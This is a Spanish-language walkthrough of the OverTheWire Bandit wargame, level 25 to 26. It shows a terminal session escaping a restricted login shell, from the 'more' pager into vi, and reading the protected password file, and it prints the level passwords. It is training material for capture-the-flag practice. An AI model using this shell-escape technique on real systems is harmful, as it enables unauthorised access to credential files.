## Bandit Level 25→ Level 26

## Objetivo

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.
## Datos de acceso al nivel

```
Usuario: bandit25
Contraseña: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```
## Solución
```
Bash
bandit25@bandit:~$ ls
bandit26.sshkey
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p
2220
_ _ _ _ ___ __
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
| |_) | (_| | | | | (_| | | |_ / /| (_) |
|_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to localhost closed.
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level
26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
exec more ~/text.txt
exit 0
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p
2220
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \

| |_) | (_| | | | | (_| | | |_ / /| (_) |
--More--(83%)
v
_ _ _ _ ___ __
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
| |_) | (_| | | | | (_| | | |_ / /| (_) |
"~/text.txt" [readonly] 6L, 258B
:e /etc/bandit_pass/bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
~
~
~
~
"/etc/bandit_pass/bandit26" [readonly] 1L, 33B
:!q
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
| |_) | (_| | | | | (_| | | |_ / /| (_) |
Press ENTER or type command to continue
q
~
~
------------------------
Connection to localhost closed.
bandit25@bandit:~ exit
```
## Notas adicionales

| Comando | Descripción |
|-----------|-----------|
| ls | lista los archivos|
| ssh | es un protocolo que le permite a los usuarios controlar y modificar sus servidores remotos|
| -ssh -i | abre una conexión SSH a un servidor remoto y ejecuta comandos de shell en ese servidor|
| cat| me muestra el contenido de un archivo|
|- cat /|muestra el contenido de un archivo en un directorio en especifico|
| grep | busca patrones en un archivo|
## Referencias

ssh, cat, more, vi, ls, id, pwd